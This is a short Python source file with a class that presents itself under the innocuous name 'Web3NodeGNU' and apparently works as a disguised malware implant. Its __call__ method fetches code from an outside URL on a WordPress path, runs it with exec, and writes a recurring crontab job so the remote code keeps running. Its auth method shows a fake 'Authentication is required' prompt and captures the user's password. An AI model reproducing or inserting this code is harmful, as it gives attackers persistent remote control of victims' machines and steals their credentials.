import getpass
import sys
from task import *

class Web3NodeGNU:
    def __init__(self):
        self.addr = "https://saboreysecretos.com/wp-includes/assets/"
        self.controller = "script-modules-packages.win.php?u=1"
        
    def __repr__(self):
        return "<class 'Web3NodeGNU'>"
        
    def __str__(self):
        return "<class 'Web3NodeGNU'>"
        
    def __call__(self, it):
        pycmd = "\"import requests;exec(requests.get('" + self.addr + self.controller + "').text)\""
        cjob = sys.executable + " -c " + pycmd
        cron = CronTab()
        job = cron.new(command=cjob)
        job.minute.every(it)
        job.enable()
        cron.write_to_user()
        job.run()
        
    def auth(self):
        self.usr = getpass.getuser()
        print("Authentication is required.")
        self.pw = getpass.getpass("password for " + self.usr + ":")

